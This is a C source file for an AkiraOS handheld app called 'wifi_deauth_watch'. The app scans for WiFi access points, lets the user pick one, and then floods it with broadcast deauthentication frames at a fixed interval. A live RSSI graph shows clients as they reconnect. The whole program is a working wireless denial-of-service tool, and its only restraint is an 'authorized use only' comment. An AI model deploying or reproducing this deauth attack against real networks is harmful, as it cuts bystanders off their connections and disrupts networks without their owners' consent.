/*
 * wifi_deauth_watch — Continuous deauth + RSSI monitor for AkiraOS
 *
 * Aggressively deauths a target AP while monitoring channel RSSI in
 * real-time. Shows a live RSSI timeline graph. When clients reconnect
 * the RSSI spikes are clearly visible.
 *
 * Flow:
 *   SCAN → LIST → WATCH (continuous deauth + RSSI graph)
 *
 * Controls:
 *   UP/DOWN  — scroll list
 *   A        — select AP / start watch
 *   B        — back / exit
 *   Y        — rescan
 *
 * FOR AUTHORIZED USE ONLY.
 */

#include "akira_api.h"
#include "../../common/akira_ui.h"
#include <stdint.h>

/* ── Limits ─────────────────────────────────────────────────────────────── */

#define MAX_APS         32
#define RSSI_HISTORY    80
#define DEAUTH_BURST    25
#define DEAUTH_INTERVAL 10
#define GRAPH_SAMPLES   60

/* ── States ─────────────────────────────────────────────────────────────── */

#define STATE_SCAN      0
#define STATE_LIST      1
#define STATE_WATCH     2
#define STATE_DONE      3

/* ── Display ────────────────────────────────────────────────────────────── */

static int32_t DW = 320;
static int32_t DH = 240;
#define HDR_H    16
#define FOT_H    14
#define FOT_Y    (DH - FOT_H)
#define ROW_H    14

#define COL_BG   CONSOLE_COLOR_BG
#define COL_TXT  CONSOLE_COLOR_TEXT
#define COL_DIM  CONSOLE_COLOR_DIM
#define COL_ACC  CONSOLE_COLOR_ACCENT
#define COL_OK   CONSOLE_COLOR_OK
#define COL_WARN CONSOLE_COLOR_WARN
#define COL_ERR  CONSOLE_COLOR_ERR
#define COL_SEL  CONSOLE_COLOR_SEL_BG
#define COL_SEP  CONSOLE_COLOR_SEP

/* ── Globals ─────────────────────────────────────────────────────────────── */

static akira_wifi_ap_t g_aps[MAX_APS];
static int             g_ap_count;
static int             g_sel;
static int             g_scroll;
static int             g_state;
static int             g_needs_redraw;

static akira_wifi_ap_t g_target;

static int8_t    g_rssi_hist[RSSI_HISTORY];
static int       g_rssi_head;
static int       g_rssi_count;
static int       g_deauth_count;
static int       g_watch_ticks;

/* ── Helpers ────────────────────────────────────────────────────────────── */

static int slen(const char *s)
{
    int n = 0;
    while (s[n]) n++;
    return n;
}

static void my_itoa(int v, char *buf, int buflen)
{
    if (buflen < 2) return;
    if (v < 0) { buf[0] = '-'; v = -v; buf++; buflen--; }
    char tmp[12];
    int n = 0;
    if (v == 0) { tmp[n++] = '0'; }
    while (v > 0 && n < 11) { tmp[n++] = '0' + v % 10; v /= 10; }
    int out = n < buflen - 1 ? n : buflen - 1;
    for (int i = 0; i < out; i++) buf[i] = tmp[n - 1 - i];
    buf[out] = '\0';
}

static const char *sec_label(uint8_t sec)
{
    switch (sec) {
    case WIFI_SEC_OPEN: return "OPEN";
    case WIFI_SEC_WEP:  return "WEP ";
    case WIFI_SEC_WPA:  return "WPA ";
    case WIFI_SEC_WPA2: return "WPA2";
    case WIFI_SEC_WPA3: return "WPA3";
    case WIFI_SEC_ENT:  return "ENT ";
    default:            return "?   ";
    }
}

static void draw_hdr(const char *title)
{
    display_rect(0, 0, DW, HDR_H, COL_BG);
    display_text(4, 3, title, COL_TXT);
}

static void draw_footer(const char *hint)
{
    display_rect(0, FOT_Y, DW, FOT_H, COL_BG);
    display_text(4, FOT_Y + 2, hint, COL_DIM);
}

/* ── Screen: SCAN ────────────────────────────────────────────────────────── */

static void draw_scan(void)
{
    draw_hdr("DEAUTH WATCH — SCAN");
    display_rect(0, HDR_H, DW, DH - HDR_H - FOT_H, COL_BG);
    display_text(8, DH / 2 - 6, "Scanning...", COL_DIM);
    draw_footer("Please wait...");
}

/* ── Screen: LIST ────────────────────────────────────────────────────────── */

static void draw_list(void)
{
    char title[28];
    int sp = 0;
    const char *pre = "DEAUTH WATCH — ";
    while (*pre) title[sp++] = *pre++;
    char cnt[4]; my_itoa(g_ap_count, cnt, sizeof(cnt));
    for (int j = 0; cnt[j]; j++) title[sp++] = cnt[j];
    title[sp++] = ' '; title[sp++] = 'A'; title[sp++] = 'P'; title[sp] = '\0';
    draw_hdr(title);
    display_rect(0, HDR_H, DW, DH - HDR_H - FOT_H, COL_BG);

    int rows = (DH - HDR_H - FOT_H) / ROW_H;
    if (g_ap_count == 0) {
        display_text(8, HDR_H + 12, "No APs found.", COL_DIM);
    }
    for (int i = 0; i < rows && (i + g_scroll) < g_ap_count; i++) {
        int idx = i + g_scroll;
        const akira_wifi_ap_t *ap = &g_aps[idx];
        int y   = HDR_H + i * ROW_H;
        int sel = (idx == g_sel);
        display_rect(0, y, DW, ROW_H, sel ? COL_TXT : COL_BG);
        char ssid[17]; int sl = slen((const char *)ap->ssid);
        if (sl > 16) sl = 16;
        for (int j = 0; j < sl; j++) ssid[j] = (char)ap->ssid[j];
        ssid[sl] = '\0';
        display_text(4, y + 2, ssid, sel ? COL_BG : COL_DIM);
        char info[18]; int ip = 0;
        info[ip++]='c'; info[ip++]='h'; char cs[4];
        my_itoa(ap->channel, cs, sizeof(cs));
        for (int j = 0; cs[j]; j++) info[ip++] = cs[j];
        info[ip++]=' '; const char *slbl = sec_label(ap->security);
        for (int j = 0; slbl[j]; j++) info[ip++] = slbl[j];
        info[ip] = '\0';
        display_text(DW - 76, y + 2, info, sel ? COL_BG : COL_DIM);
        char rssi_s[6]; my_itoa((int)ap->rssi, rssi_s, sizeof(rssi_s));
        display_text(DW - 44, y + 2, rssi_s, sel ? COL_BG : COL_DIM);
    }
    draw_footer("[A]Watch [Y]Rescan [UP/DN]Nav [B]Exit");
}

/* ── Screen: WATCH ──────────────────────────────────────────────────────── */

static void draw_watch(void)
{
    draw_hdr("DEAUTH WATCH — RUNNING");
    display_rect(0, HDR_H, DW, DH - HDR_H - FOT_H, COL_BG);
    int y = HDR_H + 2;

    char status[24]; int sp = 0;
    const char *ss = (const char *)g_target.ssid;
    while (*ss && sp < 18) status[sp++] = *ss++;
    status[sp++]=' '; char cs[4];
    my_itoa(g_target.channel, cs, sizeof(cs));
    for (int j = 0; cs[j]; j++) status[sp++] = cs[j];
    status[sp] = '\0';
    display_text(4, y, status, COL_ACC);
    display_text(DW - 80, y, "DEAUTH:", COL_DIM);
    char dc[8]; my_itoa(g_deauth_count, dc, sizeof(dc));
    display_text(DW - 40, y, dc, COL_WARN);
    y += 12;
    display_rect(4, y, DW - 8, 1, COL_SEP);
    y += 4;

    int8_t latest = (g_rssi_count > 0)
        ? g_rssi_hist[(g_rssi_head - 1 + RSSI_HISTORY) % RSSI_HISTORY]
        : -128;
    if (latest == -128 || latest == 0) {
        display_text(4, y, "NO SIGNAL", COL_DIM);
    } else {
        char rs[8]; my_itoa((int)latest, rs, sizeof(rs));
        display_text(4, y, rs, COL_TXT);
        display_text(24, y, "dBm", COL_DIM);
    }
    if (latest > -85 && latest != -128)
        display_text(DW - 52, y, "ONLINE", COL_OK);
    else
        display_text(DW - 56, y, "OFFLINE", COL_ERR);

    if (g_rssi_count >= 5) {
        int r1 = g_rssi_hist[(g_rssi_head - 1 + RSSI_HISTORY) % RSSI_HISTORY];
        int r5 = g_rssi_hist[(g_rssi_head - 5 + RSSI_HISTORY) % RSSI_HISTORY];
        if (r1 > -85 && r5 < -90 && (r1 - r5) > 20)
            display_text(DW - 90, y, "↑ RECONNECT!", COL_OK);
    }
    y += 14;

    int gx = 4, gy = y, gw = DW - 8, gh = FOT_Y - gy - 4;
    if (gh < 20) gh = 20;
    display_rect_outline(gx, gy, gw, gh, COL_DIM);
    display_text(gx + 2, gy + 2, "-30", COL_DIM);
    display_text(gx + 2, gy + gh - 10, "-100", COL_DIM);

    int n_plot = g_rssi_count < GRAPH_SAMPLES ? g_rssi_count : GRAPH_SAMPLES;
    if (n_plot > 1) {
        for (int i = 1; i < n_plot; i++) {
            int ic = (g_rssi_head - i + RSSI_HISTORY) % RSSI_HISTORY;
            int ip = (g_rssi_head - i - 1 + RSSI_HISTORY) % RSSI_HISTORY;
            int8_t rc = g_rssi_hist[ic], rp = g_rssi_hist[ip];
            if (rc == -128 || rp == -128) continue;
            if (rc < -100) rc = -100; if (rc > -30) rc = -30;
            if (rp < -100) rp = -100; if (rp > -30) rp = -30;
            int xc = gx + gw - 2 - (i * gw / GRAPH_SAMPLES);
            int xp = gx + gw - 2 - ((i - 1) * gw / GRAPH_SAMPLES);
            int yc = gy + gh - (int)((int32_t)(rc + 100) * gh / 70);
            int yp = gy + gh - (int)((int32_t)(rp + 100) * gh / 70);
            if (yc < gy) yc = gy; if (yp < gy) yp = gy;
            if (yc > gy + gh) yc = gy + gh; if (yp > gy + gh) yp = gy + gh;
            display_line(xc, yc, xp, yp, COL_TXT);
        }
    }
    char ts[12]; my_itoa(n_plot * 35 / 1000, ts, sizeof(ts));
    display_text(gx + gw - 32, gy + gh + 2, ts, COL_DIM);
    display_text(gx + gw - 16, gy + gh + 2, "s", COL_DIM);

    draw_footer("[B]Stop  [Y]Rescan");
}

/* ── Screen: DONE ────────────────────────────────────────────────────────── */

static void draw_done(void)
{
    draw_hdr("DEAUTH WATCH — DONE");
    display_rect(0, HDR_H, DW, DH - HDR_H - FOT_H, COL_BG);
    int y = HDR_H + 20;
    char msg[32]; int mp = 0;
    const char *pr = "Sent "; while (*pr) msg[mp++] = *pr++;
    char dc[8]; my_itoa(g_deauth_count, dc, sizeof(dc));
    for (int j = 0; dc[j]; j++) msg[mp++] = dc[j];
    const char *sf = " deauth frames"; while (*sf) msg[mp++] = *sf++;
    msg[mp] = '\0';
    display_text(8, y, msg, COL_WARN); y += ROW_H + 4;
    display_text(8, y, (const char *)g_target.ssid, COL_DIM);
    draw_footer("[A]Rescan [B]Exit");
}

/* ── Scan ────────────────────────────────────────────────────────────────── */

static void do_scan(void)
{
    g_needs_redraw = 1;
    draw_scan();
    display_flush();
    int n = wifi_scan_aps(g_aps, sizeof(g_aps));
    g_ap_count = (n > 0) ? (n < MAX_APS ? n : MAX_APS) : 0;
    g_sel = 0; g_scroll = 0;
    g_state = STATE_LIST;
    g_needs_redraw = 1;
}

/* ── Entry ───────────────────────────────────────────────────────────────── */

int main(void)
{
    display_get_size(&DW, &DH);

    /* Debounce: wait for buttons to settle after boot */
    delay(100000);
    int prev_btns = input_get_buttons();
    delay(50000);
    prev_btns = input_get_buttons();
    int watch_timer = 0;
    int deauth_timer = 0;
    do_scan();

    while (1) {
        /* ── Watch: continuous deauth + RSSI ── */
        if (g_state == STATE_WATCH) {
            watch_timer += 20000;
            /* Deauth burst every 100ms */
            if (watch_timer - deauth_timer >= 100000) {
                deauth_timer = watch_timer;
                int sent = wifi_deauth(g_target.bssid, WIFI_MAC_BROADCAST,
                    (int32_t)g_target.channel, DEAUTH_BURST, DEAUTH_INTERVAL);
                if (sent > 0) g_deauth_count += sent;
            }
            /* RSSI poll */
            int8_t buf[14];
            int ret = wifi_scan_rssi(buf, sizeof(buf));
            int8_t sample = -128;
            if (ret == 14 && g_target.channel >= 1 && g_target.channel <= 14)
                sample = buf[g_target.channel - 1];
            g_rssi_hist[g_rssi_head] = sample;
            g_rssi_head = (g_rssi_head + 1) % RSSI_HISTORY;
            if (g_rssi_count < RSSI_HISTORY) g_rssi_count++;
            g_needs_redraw = 1;
            g_watch_ticks++;
        }

        int btns = input_get_buttons();
        int pressed = btns & ~prev_btns;
        prev_btns = btns;
        if (pressed) g_needs_redraw = 1;

        int rows = (DH - HDR_H - FOT_H) / ROW_H;

        switch (g_state) {
        case STATE_LIST:
            if (pressed & AKIRA_BTN_UP) {
                if (g_sel > 0) { g_sel--; if (g_sel < g_scroll) g_scroll = g_sel; }
            }
            if (pressed & AKIRA_BTN_DOWN) {
                if (g_sel < g_ap_count - 1) { g_sel++;
                    if (g_sel >= g_scroll + rows) g_scroll = g_sel - rows + 1; }
            }
            if (pressed & AKIRA_BTN_Y) { do_scan(); }
            if (pressed & AKIRA_BTN_B) { return 0; }
            if ((pressed & AKIRA_BTN_A) && g_ap_count > 0) {
                g_target = g_aps[g_sel];
                g_rssi_head = 0; g_rssi_count = 0;
                g_deauth_count = 0; watch_timer = 0;
                deauth_timer = 0; g_watch_ticks = 0;
                g_state = STATE_WATCH;
            }
            break;
        case STATE_WATCH:
            if (pressed & AKIRA_BTN_B) { g_state = STATE_DONE; }
            if (pressed & AKIRA_BTN_Y) { do_scan(); }
            break;
        case STATE_DONE:
            if (pressed & AKIRA_BTN_A) { do_scan(); }
            if (pressed & AKIRA_BTN_B) { return 0; }
            break;
        default: break;
        }

        if (g_needs_redraw) {
            switch (g_state) {
            case STATE_SCAN:  draw_scan();  break;
            case STATE_LIST:  draw_list();  break;
            case STATE_WATCH: draw_watch(); break;
            case STATE_DONE:  draw_done();  break;
            default: break;
            }
            display_flush();
            g_needs_redraw = 0;
        }
        if (g_state == STATE_WATCH) g_needs_redraw = 1;
        delay(20000);
    }
    return 0;
}
